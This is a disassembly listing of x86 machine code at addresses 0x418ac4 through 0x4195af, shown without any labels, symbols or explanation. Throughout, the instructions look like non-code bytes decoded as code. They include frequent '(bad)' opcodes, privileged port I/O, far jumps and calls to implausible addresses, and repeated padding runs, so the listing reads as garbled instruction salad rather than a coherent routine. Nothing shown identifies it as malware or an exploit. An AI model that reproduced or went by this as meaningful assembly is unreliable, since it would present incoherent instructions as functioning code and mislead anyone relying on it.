  418ac4:	cmp    DWORD PTR fs:[edx],0x13
  418ac8:	mov    dl,0x96
  418aca:	pop    edi
  418acb:	add    BYTE PTR [ebx-0x7bdd3707],0x9d
  418ad2:	dec    ecx
  418ad3:	or     edx,edi
  418ad5:	mov    edi,0x108b1101
  418ada:	dec    edx
  418adb:	pushf  
  418adc:	or     cl,BYTE PTR [edx-0x3b]
  418adf:	outs   dx,DWORD PTR ds:[esi]
  418ae0:	add    BYTE PTR [ecx-0xa],0x17
  418ae4:	(bad)  
  418ae5:	mov    ecx,0xcfa521e1
  418aea:	and    bl,BYTE PTR [edi]
  418aec:	jp     0x418b32
  418aee:	inc    esi
  418aef:	inc    ebp
  418af0:	push   es
  418af1:	lods   eax,DWORD PTR ds:[si]
  418af3:	repnz xor DWORD PTR [edx-0x94837ef],ebx
  418afa:	pop    ecx
  418afb:	add    cl,bl
  418afd:	imul   edx,DWORD PTR gs:[edx*1-0x1a56167f],0x17
  418b06:	and    ah,cl
  418b08:	push   ebp
  418b09:	mov    ecx,0xf62a47ba
  418b0e:	mov    al,0x1a
  418b10:	mov    edx,0x66656ddd
  418b15:	popa   
  418b16:	lods   eax,DWORD PTR ds:[esi]
  418b17:	dec    eax
  418b18:	mov    esp,0x7338c130
  418b1d:	mov    ebp,0x439f6f74
  418b22:	sbb    al,dh
  418b24:	pop    edi
  418b25:	mov    ah,0x49
  418b27:	adc    edx,ecx
  418b29:	dec    esp
  418b2a:	imul   ebx,DWORD PTR [ebx],0xfffffff3
  418b2d:	sub    DWORD PTR [edx],0xffffffaf
  418b30:	aam    0x7c
  418b32:	jb     0x418b67
  418b34:	aam    0x22
  418b36:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418b37:	mov    esp,0xc4e51b06
  418b3c:	or     DWORD PTR [ecx-0x63],edi
  418b3f:	mov    bl,0x9b
  418b41:	stos   DWORD PTR es:[edi],eax
	...
  418bb2:	add    BYTE PTR [eax],al
  418bb4:	mov    eax,eax
  418bb6:	nop
  418bb7:	test   cl,bl
  418bb9:	aam    0x9d
  418bbb:	int    0x19
  418bbd:	xchg   edx,eax
  418bbe:	clc    
  418bbf:	(bad)  
  418bc0:	and    ch,al
  418bc2:	sub    eax,0x10cf275
  418bc7:	add    dh,dh
  418bc9:	add    BYTE PTR [eax],al
  418bcb:	add    BYTE PTR [eax+esi*8+0x445deecd],dl
  418bd2:	js     0x418c4e
  418bd4:	and    al,0xdc
  418bd6:	xchg   DWORD PTR [edi+0xe0e7f58],edi
  418bdc:	jnp    0x418c50
  418bde:	xchg   cl,bh
  418be0:	push   ds
  418be1:	(bad)  
  418be3:	test   eax,0xf8e25fc
  418be8:	pop    edi
  418be9:	inc    esi
  418bea:	sub    bl,BYTE PTR [esi+0x74]
  418bed:	shl    DWORD PTR [ebx-0x30c0e7ce],0xff
  418bf4:	add    DWORD PTR [ebp+0x22],esi
  418bf7:	cld    
  418bf8:	inc    esi
  418bf9:	cs fs mov ?,ecx
  418bfd:	or     eax,0x5c216453
  418c02:	pop    ebp
  418c03:	pop    ebp
  418c04:	idiv   ah
  418c06:	sub    DWORD PTR [eax+0x4d],0xffffffd4
  418c0a:	cld    
  418c0b:	imul   ebx,DWORD PTR [ecx-0x4e775acc],0xffffffc2
  418c12:	mov    eax,ds:0x16cfff56
  418c17:	push   esp
  418c18:	in     eax,dx
  418c19:	sbb    BYTE PTR [edx],ch
  418c1b:	mov    ds:0xbb0135ad,al
  418c20:	sub    al,0xec
  418c22:	pusha  
  418c23:	and    DWORD PTR [ebp+eax*2+0x7745064a],0xfcaf7885
  418c2e:	les    ecx,FWORD PTR [edx]
  418c30:	mov    ds:0xe1e1f10,eax
  418c35:	or     DWORD PTR [ebx+0x31],esi
  418c38:	pop    edi
  418c39:	jge    0x418c27
  418c3b:	out    dx,eax
  418c3c:	fs xor ebx,edx
  418c3f:	out    dx,eax
  418c40:	mov    eax,0x96c4ceb2
  418c45:	jmp    0xb7fd1a7f
  418c4a:	cmp    eax,0xb82bb9c6
  418c4f:	mov    bl,0x4a
  418c51:	sbb    DWORD PTR [edx-0x742405f0],edx
  418c57:	mov    edx,0x5dfef2f8
  418c5c:	(bad)  
  418c5d:	dec    esi
  418c5e:	scas   eax,DWORD PTR es:[edi]
  418c5f:	adc    DWORD PTR [edi-0x2fa82fb9],ebp
  418c65:	aaa    
  418c66:	or     cl,cl
  418c68:	and    dh,BYTE PTR [esi]
  418c6a:	mov    bl,al
  418c6c:	mov    ?,WORD PTR [edi-0x36]
  418c6f:	pop    edi
  418c70:	dec    ebp
  418c71:	mov    WORD PTR [ebx+0x3e5ff230],ds
  418c77:	pop    esi
  418c78:	inc    esi
  418c79:	repz std 
  418c7b:	scas   al,BYTE PTR es:[edi]
  418c7c:	jnp    0x418c8a
  418c7e:	add    bl,BYTE PTR [edx-0x240e1f1f]
  418c84:	addr16 mov esi,0x8e532391
  418c8a:	icebp  
  418c8b:	inc    ecx
  418c8c:	loop   0x418cc8
  418c8e:	add    DWORD PTR [ebp+0x70f7d1b6],0x3482cbd1
  418c98:	push   esi
  418c99:	mov    ds:0x9cab1769,al
  418c9e:	adc    eax,0xd3a42370
  418ca3:	jge    0x418d0c
  418ca5:	xor    dh,bl
  418ca7:	(bad)  
  418ca9:	add    dh,BYTE PTR [esi+0x62]
  418cac:	or     edi,ebp
  418cae:	lock xor al,0xf4
  418cb1:	orps   xmm4,XMMWORD PTR [edx]
  418cb4:	outs   dx,DWORD PTR ds:[esi]
  418cb5:	adc    al,0xaf
  418cb7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418cb8:	icebp  
  418cb9:	loop   0x418c82
  418cbb:	jb     0x418cdc
  418cbd:	fs ret 0xbd1f
  418cc1:	adc    eax,0x0
	...
  418d32:	add    BYTE PTR [eax],al
  418d34:	pop    ss
  418d35:	arpl   WORD PTR ds:0x5f7f7d53,bx
  418d3b:	addr16 in eax,dx
  418d3d:	inc    eax
  418d3e:	jmp    0xd8802861
  418d43:	pushf  
  418d44:	call   0xf6418e56
  418d49:	add    BYTE PTR [eax],al
  418d4b:	add    BYTE PTR [edi],cl
  418d4d:	fist   DWORD PTR [ebx]
  418d4f:	and    esp,DWORD PTR [ebp-0x43]
  418d52:	mov    BYTE PTR [edi],al
  418d54:	xchg   esi,eax
  418d55:	or     eax,0x914bd026
  418d5a:	mov    bh,0xb7
  418d5c:	jecxz  0x418ce1
  418d5e:	mov    bh,0xd3
  418d60:	(bad)  
  418d61:	xchg   ebp,eax
  418d62:	jno    0x418dc7
  418d64:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418d65:	fnstenv [edi]
  418d67:	jo     0x418d26
  418d69:	call   0x86a694a2
  418d6e:	pop    es
  418d6f:	fwait
  418d70:	cmp    esp,DWORD PTR [ebp-0x2c]
  418d73:	les    ebp,FWORD PTR [ecx+eax*2+0x66]
  418d77:	xchg   ebp,eax
  418d78:	ds jge 0x418da0
  418d7b:	dec    edi
  418d7c:	or     ah,BYTE PTR [ecx]
  418d7e:	cdq    
  418d7f:	test   DWORD PTR [ecx],edx
  418d81:	jg     0x418d44
  418d83:	jb     0x418dc1
  418d85:	mov    edx,0xebabcee0
  418d8a:	mov    ?,WORD PTR [ebp+0x1b]
  418d8d:	xor    ecx,edx
  418d8f:	int    0x41
  418d91:	add    BYTE PTR [eax+0xd],cl
  418d94:	test   DWORD PTR [edi+0x4f622ef7],edx
  418d9a:	out    0xee,al
  418d9c:	jb     0x418e15
  418d9e:	shl    BYTE PTR [eax-0x7e58b8a],1
  418da4:	mov    al,ds:0x8aed490
  418da9:	outs   dx,BYTE PTR ds:[esi]
  418daa:	dec    eax
  418dab:	inc    eax
  418dac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418dad:	xor    dh,ah
  418daf:	cmp    DWORD PTR [ebp-0x4],esp
  418db2:	mov    ds:0x1f1799ed,al
  418db7:	jns    0x418dcf
  418db9:	cmp    BYTE PTR [esi+0x179ed3bf],ah
  418dbf:	(bad)  
  418dc0:	jnp    0x418da2
  418dc2:	dec    ecx
  418dc3:	push   ss
  418dc4:	sbb    edx,DWORD PTR [ebp-0x583e5a5a]
  418dca:	sbb    ecx,DWORD PTR [eax+0x74c5eb27]
  418dd0:	(bad)  
  418dd1:	ja     0x418e4f
  418dd3:	mov    al,ds:0xde32d277
  418dd8:	fldcw  WORD PTR [ebx-0x5f41142c]
  418dde:	dec    esi
  418ddf:	stos   DWORD PTR es:[edi],eax
  418de0:	mov    WORD PTR [ebx+0x32],es
  418de3:	pop    ebx
  418de4:	rcr    cl,1
  418de6:	push   0x47
  418de8:	inc    ecx
  418de9:	sub    cl,BYTE PTR [ecx+0x61]
  418dec:	frstpm(287 only) 
  418dee:	mov    bh,0x77
  418df0:	neg    DWORD PTR [edx+0x31]
  418df3:	pop    ds
  418df4:	mov    ah,0x1d
  418df6:	(bad)  
  418df7:	pop    esi
  418df8:	sub    eax,0x900bf2a4
  418dfd:	test   al,0x5b
  418dff:	pop    esp
  418e00:	into   
  418e01:	(bad)  [esi-0x1f054630]
  418e07:	or     eax,DWORD PTR [esi]
  418e09:	xor    BYTE PTR [ebx+0x66],ch
  418e0c:	mov    ds:0x46ad9399,eax
  418e11:	sub    dl,al
  418e13:	mov    bl,0x59
  418e15:	mov    ecx,0x20a4eb50
  418e1a:	xchg   ecx,eax
  418e1b:	out    dx,al
  418e1c:	pop    esi
  418e1d:	lahf   
  418e1e:	js     0x418dee
  418e20:	cdq    
  418e21:	push   es
  418e22:	(bad)  
  418e23:	mov    eax,0x3e4a6d2a
  418e28:	inc    esi
  418e29:	or     eax,0xdfd01a21
  418e2e:	dec    edx
  418e2f:	sub    BYTE PTR [ecx-0xfe9fa22],0x14
  418e36:	push   edi
  418e37:	xchg   DWORD PTR [edx+0x7303982f],ebp
  418e3d:	(bad)  
  418e3e:	stc    
  418e3f:	mov    esp,0x82a9
	...
  418eb4:	(bad)  
  418eb5:	out    0xe6,al
  418eb7:	cmp    esp,esi
  418eb9:	cmp    edi,edi
  418ebb:	push   DWORD PTR [eax-0x20]
  418ebe:	jecxz  0x418eb9
  418ec0:	adc    DWORD PTR ss:[eax+0x10ede44],ecx
  418ec7:	add    dh,dh
  418ec9:	add    BYTE PTR [eax],al
  418ecb:	add    BYTE PTR ds:0x3adc7f26,dl
  418ed1:	js     0x418ecb
  418ed3:	ret    
  418ed4:	ja     0x418f52
  418ed6:	xchg   esi,eax
  418ed7:	add    al,0x42
  418ed9:	jae    0x418f53
  418edb:	jmp    0x815ee8ca
  418ee0:	push   ss
  418ee1:	push   esp
  418ee2:	cs sti 
  418ee4:	jg     0x418f62
  418ee6:	add    ch,BYTE PTR [eax-0x6ae1839b]
  418eec:	int3   
  418eed:	adc    DWORD PTR [esi+0x72f00be8],esi
  418ef3:	lahf   
  418ef4:	sbb    ah,bh
  418ef6:	into   
  418ef7:	(bad)
  418efa:	sbb    al,BYTE PTR [edx-0x20]
  418efd:	mov    cl,0xce
  418eff:	aam    0x78
  418f01:	lods   eax,DWORD PTR ds:[esi]
  418f02:	mov    ch,0x81
  418f04:	lods   eax,DWORD PTR ds:[esi]
  418f05:	pop    ecx
  418f06:	inc    eax
  418f07:	and    BYTE PTR [edx+0xe],bh
  418f0a:	push   ecx
  418f0b:	pop    eax
  418f0c:	std    
  418f0d:	xchg   ecx,eax
  418f0e:	sub    DWORD PTR [edi+0x6aea8c72],ebp
  418f14:	dec    ebp
  418f15:	scas   al,BYTE PTR es:[edi]
  418f16:	enter  0x2fac,0x48
  418f1a:	enter  0x266f,0x84
  418f1e:	or     ebx,DWORD PTR [eax-0x38]
  418f21:	bound  esp,QWORD PTR [ebp+0x8aa4222]
  418f27:	sbb    esp,DWORD PTR [eax-0x78]
  418f2a:	repz push cs
  418f2c:	retf   
  418f2d:	outs   dx,BYTE PTR ds:[esi]
  418f2e:	scas   al,BYTE PTR es:[edi]
  418f2f:	mov    ds:0x584734bc,eax
  418f34:	out    0xf8,al
  418f36:	test   DWORD PTR [eax+edi*2+0x13],edi
  418f3a:	js     0x418f4e
  418f3c:	std    
  418f3d:	ss sbb eax,0x553f05f5
  418f43:	sbb    ah,BYTE PTR [ebx+0x49b17997]
  418f49:	jmp    0xf08b1d19
  418f4e:	pop    ebx
  418f4f:	adc    BYTE PTR [edx],dl
  418f51:	test   al,0x95
  418f53:	dec    edi
  418f54:	sub    ebp,DWORD PTR [edx+0x1b9ebd4a]
  418f5a:	fs pop eax
  418f5c:	es dec ebp
  418f5e:	mov    DWORD PTR [ebx-0x76],ecx
  418f61:	fist   WORD PTR [ebp-0x19]
  418f64:	pop    ss
  418f65:	sbb    al,0xa6
  418f67:	inc    ecx
  418f68:	nop
  418f69:	sti    
  418f6a:	mov    ds:0x60027eb4,al
  418f6f:	scas   eax,DWORD PTR es:[edi]
  418f70:	jns    0x418f1d
  418f72:	pop    eax
  418f73:	push   ds
  418f74:	jle    0x418f80
  418f76:	adc    dl,BYTE PTR [ebx+0x3038eca9]
  418f7c:	jle    0x418ff8
  418f7e:	outs   dx,BYTE PTR cs:[esi]
  418f80:	add    eax,0xd84b08b
  418f85:	or     al,0x8b
  418f87:	sbb    ah,BYTE PTR [esi]
  418f89:	cmp    al,0x97
  418f8b:	adc    BYTE PTR [esi+0x5ce9aa36],bh
  418f91:	mov    eax,ds:0x44ca7f79
  418f96:	xchg   BYTE PTR [ecx-0x60797c8],bh
  418f9c:	lods   eax,DWORD PTR ds:[esi]
  418f9d:	aam    0x1f
  418f9f:	jo     0x418faa
  418fa1:	in     al,dx
  418fa2:	or     eax,DWORD PTR [ebx+ebx*1-0x1cad14f0]
  418fa9:	cmp    al,0x35
  418fab:	cmp    eax,0x856d53b
  418fb0:	in     al,dx
  418fb1:	icebp  
  418fb2:	jl     0x418f9b
  418fb4:	xor    eax,0xa2071092
  418fb9:	cld    
  418fba:	jns    0x418fcb
  418fbc:	call   0x5f:0x6f5ea51a
	...
  419033:	add    BYTE PTR [ecx-0xba9482],ch
  419039:	push   ebp
  41903a:	scas   eax,DWORD PTR es:[edi]
  41903b:	(bad)  
  41903c:	out    dx,eax
  41903d:	mov    ch,0xb6
  41903f:	shl    dl,cl
  419041:	sbb    dh,bl
  419043:	xchg   edx,eax
  419044:	aam    0xf
  419046:	add    DWORD PTR [eax],eax
  419048:	test   BYTE PTR [eax],0x0
  41904b:	add    BYTE PTR [ebx],ch
  41904d:	outs   dx,BYTE PTR ds:[esi]
  41904e:	arpl   ax,sp
  419050:	in     al,0xd2
  419052:	jbe    0x419064
  419054:	mov    bl,0x5e
  419056:	add    al,0x22
  419058:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419059:	mov    ebx,0xce17e08b
  41905e:	ins    DWORD PTR es:[edi],dx
  41905f:	dec    edx
  419060:	push   ebp
  419061:	mov    esi,0x7e8bbec6
  419066:	cmp    BYTE PTR [eax+0x7805d674],bl
  41906c:	dec    eax
  41906d:	popa   
  41906e:	out    dx,eax
  41906f:	push   ds
  419070:	and    eax,0xa4ed5e39
  419075:	xor    DWORD PTR [edx],0xf68ef1aa
  41907b:	xchg   BYTE PTR ds:0xb6c1b146,dh
  419081:	ins    DWORD PTR es:[edi],dx
  419082:	pop    esp
  419083:	retf   
  419084:	imul   eax,DWORD PTR [edi+0x7f],0xee7566d
  41908b:	loop   0x4190b0
  41908d:	pop    edi
  41908e:	cmc    
  41908f:	(bad)  
  419090:	cmp    ecx,DWORD PTR [ebx-0x6a]
  419093:	mov    esi,0xe2e10b53
  419098:	fisub  WORD PTR [ebp+ebx*1+0x3f50a896]
  41909f:	enter  0x8d6,0x3c
  4190a3:	nop
  4190a4:	xchg   esi,eax
  4190a5:	ins    BYTE PTR es:[edi],dx
  4190a6:	in     eax,dx
  4190a7:	mov    ebp,0x4f90c2d4
  4190ac:	jb     0x41909f
  4190ae:	push   esp
  4190af:	adc    BYTE PTR [esi-0x790aaf20],al
  4190b5:	push   esi
  4190b6:	fdivr  st(7),st
  4190b8:	aam    0xfa
  4190ba:	vhaddpd xmm0,xmm5,XMMWORD PTR [edi-0x48]
  4190bf:	and    eax,0xa50ce94b
  4190c4:	mov    ah,BYTE PTR [eax+0x35]
  4190c7:	(bad)  
  4190c8:	mov    DWORD PTR [esi+0x172d5c7f],ebx
  4190ce:	xor    DWORD PTR [eax-0xb],0x33bcdafc
  4190d5:	mov    dh,0x73
  4190d7:	jl     0x4190ca
  4190d9:	xor    al,0x1b
  4190db:	pop    DWORD PTR [ebx]
  4190dd:	leave  
  4190de:	adc    al,0xb1
  4190e0:	or     BYTE PTR [eax+0x6a32b5d1],0x7c
  4190e7:	add    DWORD PTR [ebx-0x4279a7db],0xffffffd5
  4190ee:	xchg   edi,eax
  4190ef:	mov    eax,0x8d9f3413
  4190f4:	pusha  
  4190f5:	mul    edx
  4190f7:	sub    DWORD PTR [ecx],ebp
  4190f9:	popa   
  4190fa:	int3   
  4190fb:	pop    ecx
  4190fc:	jb     0x41909f
  4190fe:	adc    al,0xab
  419100:	and    al,0x49
  419102:	lods   al,BYTE PTR ds:[esi]
  419103:	mov    ecx,0x48917b26
  419108:	jae    0x419116
  41910a:	cmp    BYTE PTR [eax-0x2b],dl
  41910d:	adc    eax,0x9361f54f
  419112:	xchg   ebp,eax
  419113:	mov    eax,ds:0xc4d18fa9
  419118:	dec    edi
  419119:	(bad)  
  41911a:	pop    ss
  41911b:	jne    0x4190ff
  41911d:	mov    bh,0xc
  41911f:	sahf   
  419120:	in     eax,dx
  419121:	mov    eax,edi
  419123:	leave  
  419124:	adc    al,0x4d
  419126:	jmp    0x419194
  419128:	pop    esi
  419129:	sti    
  41912a:	dec    esp
  41912b:	addr16 dec ebx
  41912d:	sub    eax,0xb68c4938
  419132:	push   0x6e
  419134:	jno    0x41912e
  419136:	test   edi,0x314b65bb
  41913c:	cmc    
  41913d:	outs   dx,DWORD PTR ds:[esi]
  41913e:	pop    esi
  41913f:	push   ds
  419140:	fcmovnb st,st(7)
	...
  4191b2:	add    BYTE PTR [eax],al
  4191b4:	aaa    
  4191b5:	xchg   edx,eax
  4191b6:	and    al,0x83
  4191b8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4191b9:	mov    bh,0xb7
  4191bb:	mov    dh,0xb3
  4191bd:	cmp    al,0x9b
  4191bf:	scas   eax,DWORD PTR es:[edi]
  4191c0:	jp     0x419222
  4191c2:	mov    edx,0x110caca
  4191c7:	add    dh,dh
  4191c9:	add    BYTE PTR [eax],al
  4191cb:	add    BYTE PTR [ecx],dl
  4191cd:	mov    bl,0xc0
  4191cf:	fldenv [edi-0x675519be]
  4191d5:	and    al,0xa2
  4191d7:	inc    eax
  4191d8:	in     al,0x34
  4191da:	push   esi
  4191db:	pop    esi
  4191dc:	jle    0x62dfd448
  4191e2:	cld    
  4191e3:	jg     0x419221
  4191e5:	leave  
  4191e6:	sbb    al,0x86
  4191e8:	imul   esi,DWORD PTR [ecx-0x78b0faf8],0x8769c76d
  4191f2:	daa    
  4191f3:	push   ss
  4191f4:	jb     0x419194
  4191f6:	sbb    DWORD PTR [edi+0x55],edi
  4191f9:	(bad)  
  4191fa:	in     eax,dx
  4191fb:	jb     0x419265
  4191fd:	stc    
  4191fe:	xor    al,0x97
  419200:	shl    DWORD PTR ds:0xcf8177b1,1
  419206:	xor    eax,0x5f5a3f32
  41920b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41920c:	cmp    DWORD PTR [edi-0xd012b68],edx
  419212:	popf   
  419213:	jo     0x41919c
  419215:	packssdw mm0,QWORD PTR [eax-0x6244df7b]
  41921c:	arpl   WORD PTR [eax+0x32],ax
  41921f:	sar    DWORD PTR [esi+0x69],cl
  419222:	mov    ch,0xb8
  419224:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419225:	mov    esi,0xccc8a2be
  41922a:	enter  0xb59f,0x68
  41922e:	jb     0x41926c
  419230:	pop    ecx
  419231:	not    DWORD PTR [ebp+ecx*8-0x79a58b9e]
  419238:	pop    ss
  419239:	scas   al,BYTE PTR es:[edi]
  41923a:	(bad)  
  41923b:	out    0xdf,eax
  41923d:	mov    ebp,0x79ee2da7
  419242:	mov    DWORD PTR [ecx+eax*1],eax
  419245:	std    
  419246:	jmp    0x71c887da
  41924b:	dec    ebp
  41924c:	fistp  WORD PTR [eax+0x13e62774]
  419252:	pop    esi
  419253:	push   ss
  419254:	ret    
  419255:	adc    DWORD PTR [edx+0xed46ce4],0x7e9496b3
  41925f:	mov    dl,0x28
  419261:	mov    cl,0x6e
  419263:	push   ecx
  419264:	sbb    eax,0x53d1841b
  419269:	outs   dx,DWORD PTR ds:[esi]
  41926a:	jnp    0x419247
  41926c:	inc    esi
  41926d:	ss mov cl,ch
  419270:	into   
  419271:	xor    al,0x78
  419273:	test   eax,0x80b4a448
  419278:	inc    ecx
  419279:	(bad)  
  41927a:	xor    al,0x3d
  41927c:	or     ecx,esp
  41927e:	or     BYTE PTR [ecx],ah
  419280:	push   es
  419281:	push   es
  419282:	or     BYTE PTR [ebx+0x5c],dl
  419285:	sbb    al,0xc7
  419287:	sub    DWORD PTR [edx+0x1dda3190],esp
  41928d:	cmp    ebx,DWORD PTR [edx+0x35fe0f56]
  419293:	xor    bl,bh
  419295:	in     al,0x86
  419297:	retf   0xd123
  41929a:	jmp    0x5141:0xab034602
  4192a1:	in     eax,dx
  4192a2:	push   ecx
  4192a3:	cmp    edx,eax
  4192a5:	push   es
  4192a6:	jnp    0x419287
  4192a8:	push   0x5132b28c
  4192ad:	add    BYTE PTR [eax+0x6aa0f4db],bl
  4192b3:	lea    esi,fs:[edi+ecx*8-0x1f7a78cc]
  4192bb:	sub    ah,ch
  4192bd:	rcl    DWORD PTR [ebx],0x31
  4192c0:	int3   
  4192c1:	xlat   BYTE PTR ds:[ebx]
	...
  419332:	add    BYTE PTR [eax],al
  419334:	fdiv   QWORD PTR [ebx-0x2380afc1]
  41933a:	(bad)  
  41933b:	mov    edi,0xbcd03e15
  419340:	mov    dh,0xac
  419342:	dec    edi
  419343:	add    al,0x11
  419346:	add    DWORD PTR [eax],eax
  419348:	test   BYTE PTR [eax],0x0
  41934b:	add    BYTE PTR [edx],ah
  41934d:	mov    eax,0xf24d1dd4
  419352:	pop    ss
  419353:	inc    esp
  419354:	jb     0x41937e
  419356:	pop    ecx
  419357:	dec    ebx
  419358:	icebp  
  419359:	adc    DWORD PTR [esi],edi
  41935b:	xor    eax,0xe51830fb
  419360:	ins    DWORD PTR es:[edi],dx
  419361:	fadd   QWORD PTR [esi-0x4f]
  419364:	std    
  419365:	cld    
  419366:	call   DWORD PTR [edi-0x15]
  419369:	and    BYTE PTR [ebp-0x2a],bl
  41936c:	in     eax,0x95
  41936e:	xor    dh,bh
  419370:	jae    0x4193ab
  419372:	icebp  
  419373:	icebp  
  419374:	repnz xchg dx,ax
  419377:	dec    esp
  419378:	xchg   ebp,eax
  419379:	imul   ebp,DWORD PTR [edi+0x1a0ed0fd],0x7129d532
  419383:	inc    edi
  419384:	aam    0x5a
  419386:	rol    DWORD PTR ds:0x5782a37,0x83
  41938d:	(bad)  
  41938e:	repz inc ecx
  419390:	pop    edx
  419391:	push   0x67
  419393:	dec    ebx
  419394:	xchg   ecx,eax
  419395:	add    BYTE PTR [ebx],cl
  419397:	or     eax,0x1d9aab70
  41939c:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  41939e:	int3   
  41939f:	dec    DWORD PTR [ebx-0x67]
  4193a2:	jo     0x41936a
  4193a4:	jp     0x419400
  4193a6:	arpl   WORD PTR [esi+esi*4+0x6a],bp
  4193aa:	fcomip st,st(2)
  4193ac:	fistp  QWORD PTR [ebp-0x6f]
  4193af:	mov    edi,0xbda3ea44
  4193b4:	cmc    
  4193b5:	adc    eax,0x9e99fa0d
  4193ba:	mov    dh,BYTE PTR [eax+0x3db8a058]
  4193c0:	fstp   DWORD PTR [edx-0x37656794]
  4193c6:	xchg   BYTE PTR [ecx],dl
  4193c8:	push   ebx
  4193c9:	and    al,0x53
  4193cb:	in     al,0xa6
  4193cd:	scas   eax,DWORD PTR es:[edi]
  4193ce:	add    al,0x8
  4193d0:	adc    eax,0x936e7e12
  4193d5:	sub    al,0xb5
  4193d7:	repz cli 
  4193d9:	xchg   edi,eax
  4193da:	(bad)  
  4193db:	repnz xlat BYTE PTR ds:[ebx]
  4193dd:	lods   al,BYTE PTR ds:[esi]
  4193de:	loope  0x41941c
  4193e0:	aas    
  4193e1:	mov    esi,0x19d9b431
  4193e6:	aam    0x90
  4193e8:	cmc    
  4193e9:	dec    esp
  4193ea:	pop    es
  4193eb:	je     0x41937f
  4193ed:	xor    DWORD PTR [ebx+0xa2a17cd],esi
  4193f3:	cwde   
  4193f4:	nop
  4193f5:	or     ah,BYTE PTR [edi-0x3cd39113]
  4193fb:	or     esp,DWORD PTR [ebp+edx*8+0x19132cd2]
  419402:	xchg   edi,eax
  419403:	mov    ebp,0xd833136b
  419408:	mov    WORD PTR [ecx-0x36],fs
  41940b:	and    DWORD PTR [eax+edx*2-0x17646c7e],0x9
  419413:	jb     0x4193de
  419415:	or     BYTE PTR [esi-0x77],dl
  419418:	cmp    BYTE PTR [edx+0x523a921c],cl
  41941e:	xchg   ebx,eax
  41941f:	das    
  419420:	mov    edx,0xfc11bc1e
  419425:	cmp    al,0x60
  419427:	xor    al,0xb3
  419429:	in     eax,dx
  41942a:	leave  
  41942b:	push   ebx
  41942c:	jmp    0x41946e
  41942e:	and    BYTE PTR [ecx],al
  419430:	imul   ecx,DWORD PTR [esi-0x6a0fd84d],0x30
  419437:	cld    
  419438:	out    dx,al
  419439:	fcom   QWORD PTR [eax]
  41943b:	pop    es
  41943c:	mov    ds:0x1a5309be,al
  419441:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
	...
  4194b2:	add    BYTE PTR [eax],al
  4194b4:	inc    ecx
  4194b5:	stc    
  4194b6:	mov    ebx,ebx
  4194b8:	mov    ebx,0x95fb51fb
  4194bd:	fidivr WORD PTR [ebx+0x2c]
  4194c0:	mov    WORD PTR [edi-0x67],ds
  4194c3:	div    BYTE PTR [esi-0x9fffeee]
  4194c9:	add    BYTE PTR [eax],al
  4194cb:	add    BYTE PTR [edx+0x5f],ch
  4194ce:	test   DWORD PTR [ecx-0x36126fce],ebp
  4194d4:	popa   
  4194d5:	daa    
  4194d6:	div    DWORD PTR [edi+0x4f]
  4194d9:	inc    ch
  4194db:	jle    0x4194f8
  4194dd:	push   ecx
  4194de:	adc    al,0x8c
  4194e0:	(bad)  
  4194e1:	mov    ch,0x7d
  4194e3:	mov    DWORD PTR [ebp+0x3d11b660],0x5c4e783e
  4194ed:	mov    dh,0x92
  4194ef:	and    eax,0xc5ec1abd
  4194f4:	imul   edi,DWORD PTR [edi-0x5],0xfffffff5
  4194f8:	scas   al,BYTE PTR es:[edi]
  4194f9:	je     0x419570
  4194fb:	adc    DWORD PTR [ecx],esi
  4194fd:	dec    eax
  4194fe:	or     DWORD PTR [ebx+0x18c24f71],ebp
  419504:	jnp    0x4194bd
  419506:	xor    BYTE PTR [edi+0xb],al
  419509:	jp     0x4194b7
  41950b:	aas    
  41950c:	fild   QWORD PTR [edx-0x6b]
  41950f:	and    ebp,DWORD PTR [edi-0x14]
  419512:	sbb    DWORD PTR [edi-0x1b],ebx
  419515:	std    
  419516:	iret   
  419517:	dec    edx
  419518:	ins    BYTE PTR es:[edi],dx
  419519:	pop    bx
  41951b:	out    dx,eax
  41951c:	int3   
  41951d:	repnz out 0x4b,eax
  419520:	xchg   ecx,eax
  419521:	adc    al,0xc3
  419523:	je     0x4194f9
  419525:	aas    
  419526:	jecxz  0x4195a7
  419528:	popf   
  419529:	cwde   
  41952a:	push   esi
  41952b:	cmp    eax,0x57f76467
  419530:	mov    WORD PTR [ecx-0x1671e483],fs
  419536:	push   ds
  419537:	sub    al,0x58
  419539:	dec    ebx
  41953a:	sbb    al,0xf4
  41953c:	daa    
  41953d:	pop    ecx
  41953e:	cmp    eax,0xa18fb0fd
  419543:	sbb    eax,0xa3aefd09
  419548:	in     al,0xd2
  41954a:	pop    ss
  41954b:	fidivr DWORD PTR [edi+0x775ca624]
  419551:	mov    esi,ecx
  419553:	popf   
  419554:	adc    BYTE PTR [ebx+0x31],dh
  419557:	jp     0x419555
  419559:	lahf   
  41955a:	call   0xf625:0x34dd80ca
  419561:	ucomiss xmm3,xmm2
  419564:	adc    eax,0x3b6489e9
  419569:	cmp    DWORD PTR [ebx-0x69],esi
  41956c:	cmp    eax,0x916e1a2e
  419571:	inc    ecx
  419572:	lock xor ebx,edx
  419575:	aad    0x19
  419577:	or     ah,BYTE PTR [esi]
  419579:	out    0x73,eax
  41957b:	pop    edi
  41957c:	xchg   ebx,eax
  41957d:	ret    
  41957e:	iret   
  41957f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419580:	aaa    
  419581:	mov    dl,0xac
  419583:	pop    ebp
  419584:	fidiv  WORD PTR [ebx+0x65]
  419587:	jnp    0x4195df
  419589:	and    al,0xcb
  41958b:	je     0x419519
  41958d:	rcr    BYTE PTR [eax-0x5fdb9188],cl
  419593:	ret    
  419594:	xchg   ebx,eax
  419595:	clc    
  419596:	xchg   esp,eax
  419597:	hlt    
  419598:	and    BYTE PTR [esi],al
  41959a:	test   eax,0x546d75f0
  41959f:	js     0x4195d6
  4195a1:	mov    esp,esi
  4195a3:	lods   al,BYTE PTR ds:[esi]
  4195a4:	xchg   bx,ax
  4195a6:	adc    eax,0xbd184838
  4195ab:	outs   dx,DWORD PTR ds:[esi]
  4195ac:	mov    dh,0xcf
  4195ae:	aaa    
  4195af:	cli    
